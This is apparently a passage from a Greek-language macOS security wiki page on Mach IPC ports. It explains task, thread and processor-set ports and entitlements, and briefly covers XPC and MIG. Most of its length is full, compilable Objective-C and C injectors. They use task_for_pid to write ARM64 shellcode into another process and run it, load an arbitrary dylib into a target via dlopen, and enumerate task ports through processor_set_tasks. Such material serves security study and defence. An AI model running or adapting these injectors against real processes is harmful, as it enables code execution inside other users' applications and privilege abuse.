Είναι δυνατό να **δει κανείς όλες τις host special ports** εκτελώντας:
```bash
procexp all ports | grep "HSP"
```
### Ειδικές θύρες Task

Πρόκειται για θύρες δεσμευμένες για γνωστές υπηρεσίες. Είναι δυνατό να τις λάβετε/ορίσετε καλώντας `task_[get/set]_special_port`. Βρίσκονται στο `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
Από [εδώ](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: Η θύρα που χρησιμοποιείται για τον έλεγχο αυτού του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που επηρεάζουν το task. Αυτή είναι η θύρα που επιστρέφεται από **mach_task_self (βλέπε Task Ports παρακάτω)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Η bootstrap θύρα του task. Χρησιμοποιείται για την αποστολή μηνυμάτων που ζητούν επιστροφή άλλων θυρών συστημικών υπηρεσιών.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Η θύρα που χρησιμοποιείται για να ζητηθούν πληροφορίες του περιέχοντος host. Αυτή είναι η θύρα που επιστρέφεται από **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Η θύρα που ονομάζει την πηγή από την οποία αυτό το task αντλεί την wired kernel μνήμη του.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Η θύρα που ονομάζει την πηγή από την οποία αυτό το task αντλεί την προεπιλεγμένη διαχειριζόμενη μνήμη του.

### Θύρες task

Αρχικά το Mach δεν είχε "processes", είχε "tasks", που θεωρούνταν περισσότερο σαν δοχείο (container) νημάτων. Όταν το Mach συγχωνεύτηκε με το BSD, **κάθε task συσχετίστηκε με μια BSD διαδικασία**. Συνεπώς κάθε BSD διαδικασία έχει τις λεπτομέρειες που χρειάζεται για να είναι διαδικασία και κάθε Mach task έχει επίσης τη δική του εσωτερική λειτουργία (εκτός από το ανύπαρκτο pid 0 που είναι το `kernel_task`).

Υπάρχουν δύο πολύ ενδιαφέρουσες συναρτήσεις σχετικές με αυτό:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Παίρνει ένα SEND δικαίωμα για την task port του task που αντιστοιχεί στο συγκεκριμένο `pid` και το παραχωρεί στην υποδεικνυόμενη `target_task_port` (που συνήθως είναι το task του καλούντος που έχει χρησιμοποιήσει `mach_task_self()`, αλλά θα μπορούσε να είναι μια SEND θύρα σε διαφορετικό task).
- `pid_for_task(task, &pid)`: Δεδομένου ενός SEND δικαιώματος για ένα task, βρίσκει σε ποιο PID σχετίζεται αυτό το task.

Για να εκτελέσει ενέργειες μέσα στο task, το task χρειάζεται ένα `SEND` δικαίωμα προς τον εαυτό του καλώντας `mach_task_self()` (που χρησιμοποιεί τον `task_self_trap` (28)). Με αυτή την άδεια ένα task μπορεί να εκτελέσει διάφορες ενέργειες όπως:

- `task_threads`: Αποκτά SEND δικαίωμα πάνω σε όλες τις task ports των νημάτων του task
- `task_info`: Λαμβάνει πληροφορίες για ένα task
- `task_suspend/resume`: Αναστέλλει ή επανεκκινεί ένα task
- `task_[get/set]_special_port`
- `thread_create`: Δημιουργεί ένα thread
- `task_[get/set]_state`: Ελέγχει την κατάσταση του task
- και περισσότερα μπορούν να βρεθούν στο [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Σημειώστε ότι με ένα SEND δικαίωμα πάνω στην task port ενός **διαφορετικού task**, είναι δυνατό να εκτελεστούν τέτοιες ενέργειες σε αυτό το διαφορετικό task.

Επιπλέον, το task_port είναι επίσης η θύρα **`vm_map`** που επιτρέπει το **διάβασμα και τον χειρισμό της μνήμης** μέσα σε ένα task με συναρτήσεις όπως `vm_read()` και `vm_write()`. Αυτό ουσιαστικά σημαίνει ότι ένα task με SEND δικαιώματα πάνω στην task_port ενός άλλου task θα μπορεί να **ενέσει κώδικα σε εκείνο το task**.

Να θυμάστε ότι επειδή ο **kernel είναι επίσης ένα task**, αν κάποιος καταφέρει να αποκτήσει **SEND δικαιώματα** πάνω στο **`kernel_task`**, θα μπορεί να κάνει τον kernel να εκτελέσει οτιδήποτε (jailbreaks).

- Καλέστε `mach_task_self()` για να **πάρετε το όνομα** αυτής της θύρας για το task του καλούντος. Αυτή η θύρα μόνο **κληρονομείται** μέσω του **`exec()`**· ένα νέο task που δημιουργείται με `fork()` παίρνει μια νέα task port (ως ειδική περίπτωση, ένα task παίρνει επίσης νέα task port μετά από `exec()` σε suid binary). Ο μόνος τρόπος να δημιουργήσετε ένα task και να πάρετε την port του είναι να εκτελέσετε το ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) κατά τη διάρκεια ενός `fork()`.
- Αυτοί είναι οι περιορισμοί για την πρόσβαση στη θύρα (από `macos_task_policy` του binary `AppleMobileFileIntegrity`):
- Αν η εφαρμογή έχει το **`com.apple.security.get-task-allow` entitlement**, διαδικασίες από **τον ίδιο χρήστη μπορούν να έχουν πρόσβαση στην task port** (συνήθως προστίθεται από το Xcode για debugging). Η διαδικασία **notarization** δεν το επιτρέπει σε production releases.
- Εφαρμογές με το **`com.apple.system-task-ports`** entitlement μπορούν να πάρουν την **task port για οποιαδήποτε** διαδικασία, εκτός από τον kernel. Σε παλαιότερες εκδόσεις λεγόταν **`task_for_pid-allow`**. Αυτό χορηγείται μόνο σε εφαρμογές της Apple.
- **Ο root έχει πρόσβαση στις task ports** εφαρμογών **που δεν** έχουν μεταγλωττιστεί με hardened runtime (και που δεν είναι από την Apple).

**The task name port:** Μια μη προνομιούχα έκδοση της _task port_. Αναφέρεται στο task, αλλά δεν επιτρέπει τον έλεγχό του. Το μόνο που φαίνεται διαθέσιμο μέσω αυτής είναι `task_info()`.

### Θύρες thread

Τα threads έχουν επίσης συσχετισμένες θύρες, οι οποίες είναι ορατές από το task καλώντας **`task_threads`** και από τον επεξεργαστή με `processor_set_threads`. Ένα SEND δικαίωμα προς την thread port επιτρέπει τη χρήση συναρτήσεων από το υποσύστημα `thread_act`, όπως:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Κάθε thread μπορεί να πάρει αυτή τη θύρα καλώντας **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Μπορείτε να πάρετε ένα shellcode από:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Μεταγλωττίστε** το προηγούμενο πρόγραμμα και προσθέστε τα **entitlements** για να μπορείτε να inject code με τον ίδιο χρήστη (αλλιώς θα χρειαστεί να χρησιμοποιήσετε **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Για να λειτουργήσει αυτό στο iOS χρειάζεστε το entitlement `dynamic-codesigning` ώστε να μπορείτε να κάνετε εκτελέσιμη μια εγγράψιμη μνήμη.

### Dylib Injection in thread via Task port

Στο macOS **threads** μπορεί να χειριστούν μέσω του **Mach** ή χρησιμοποιώντας το **posix `pthread` api**. Το thread που δημιουργήσαμε στην προηγούμενη injection δημιουργήθηκε χρησιμοποιώντας το Mach api, οπότε **it's not posix compliant**.

Ήταν δυνατό να **inject a simple shellcode** για να εκτελεστεί μια εντολή επειδή **didn't need to work with posix** compliant apis, μόνο με Mach. **More complex injections** θα απαιτούσαν το **thread** να είναι επίσης **posix compliant**.

Επομένως, για να **improve the thread** θα πρέπει να καλέσει **`pthread_create_from_mach_thread`** που θα **create a valid pthread**. Στη συνέχεια, αυτό το νέο pthread θα μπορούσε να **call dlopen** για να **load a dylib** από το σύστημα, έτσι αντί να γράφεις νέο shellcode για να εκτελέσεις διαφορετικές ενέργειες είναι δυνατόν να φορτώσεις custom libraries.

Μπορείς να βρεις **example dylibs** σε (για παράδειγμα αυτό που δημιουργεί ένα log και μετά μπορείς να το ακούσεις):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Σε αυτή την τεχνική ένα thread της διεργασίας παραβιάζεται:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Η κλήση των `task_for_pid` ή `thread_create_*` αυξάνει έναν μετρητή στη struct task του kernel, ο οποίος μπορεί να προσεγγιστεί από user mode καλώντας `task_info(task, TASK_EXTMOD_INFO, ...)`

## Exception Ports

Όταν εμφανίζεται μια exception σε ένα thread, αυτή η exception αποστέλλεται στο ορισμένο exception port του thread. Εάν το thread δεν το χειριστεί, τότε αποστέλλεται στα task exception ports. Εάν το task δεν το χειριστεί, τότε αποστέλλεται στο host port που διαχειρίζεται το launchd (όπου θα αναγνωριστεί). Αυτό ονομάζεται exception triage.

Σημειώστε ότι στο τέλος, αν δεν χειριστεί σωστά, το report συνήθως θα καταλήξει να χειριστείται από τον ReportCrash daemon. Ωστόσο, είναι πιθανό ένα άλλο thread μέσα στο ίδιο task να διαχειριστεί την exception — αυτό κάνουν εργαλεία crash reporting όπως `PLCreashReporter`.

## Other Objects

### Clock

Ο οποιοσδήποτε χρήστης μπορεί να έχει πρόσβαση σε πληροφορίες για το clock, ωστόσο για να ορίσει την ώρα ή να αλλάξει άλλες ρυθμίσεις πρέπει να είναι root.

Για να λάβετε πληροφορίες, είναι δυνατό να καλέσετε συναρτήσεις από το `clock` subsystem όπως: `clock_get_time`, `clock_get_attributtes` ή `clock_alarm`\
Για να τροποποιηθούν τιμές, το `clock_priv` subsystem μπορεί να χρησιμοποιηθεί με συναρτήσεις όπως `clock_set_time` και `clock_set_attributes`

### Processors and Processor Set

Οι processor APIs επιτρέπουν τον έλεγχο ενός μεμονωμένου λογικού επεξεργαστή καλώντας συναρτήσεις όπως `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Επιπλέον, οι **processor set** APIs παρέχουν έναν τρόπο να ομαδοποιηθούν πολλαπλοί επεξεργαστές σε μια ομάδα. Είναι δυνατό να ανακτήσετε το προεπιλεγμένο processor set καλώντας **`processor_set_default`**.\
Αυτές είναι μερικές ενδιαφέρουσες APIs για αλληλεπίδραση με το processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

Όπως αναφέρεται στο [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), στο παρελθόν αυτό επέτρεπε να παρακαμφθεί η προαναφερθείσα προστασία για να αποκτηθούν task ports σε άλλες διεργασίες και να τις ελέγξει κανείς καλώντας **`processor_set_tasks`** και λαμβάνοντας ένα host port σε κάθε διεργασία.\
Σήμερα χρειάζεται root για να χρησιμοποιηθεί αυτή η συνάρτηση και αυτό είναι προστατευμένο, οπότε θα μπορείτε να αποκτήσετε αυτά τα ports μόνο σε μη προστατευμένες διεργασίες.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
